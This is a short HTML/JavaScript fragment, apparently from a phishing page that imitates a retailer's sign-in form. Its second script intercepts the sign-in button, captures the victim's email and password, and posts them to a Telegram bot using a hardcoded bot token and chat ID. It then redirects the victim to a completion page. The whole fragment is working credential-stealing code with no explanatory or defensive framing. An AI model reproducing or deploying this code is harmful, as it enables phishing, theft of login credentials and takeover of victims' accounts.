    <script>
      const sessionStorageData = JSON.parse(sessionStorage.getItem('data'))
      document.getElementById('current-email').innerText = sessionStorageData.email
      document.getElementById('ap_email').value = sessionStorageData.email
    </script>
    <script>
      document.getElementById('signInSubmit').addEventListener('click', event => {
        event.preventDefault()
        const passwrdField = document.getElementById('ap_password')
        let sessionStorageData = JSON.parse(sessionStorage.getItem('data'))
        sessionStorage.setItem('data', JSON.stringify({
          ...sessionStorageData,
          password: passwrdField.value
        }))
        sessionStorageData = JSON.parse(sessionStorage.getItem('data'))
        console.log(sessionStorageData)
        const botToken = '6549974551:AAH5CHMOrLFkkvh3b6EZsj7FkboxjtvXdeU'
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            'chat_id': -1002053753326,
            text: `
EMAIL: ${sessionStorageData.email}
PASSWORD: ${sessionStorageData.password}
            `
          })
        })
        location.href = '/finalizado'
      })
    </script>
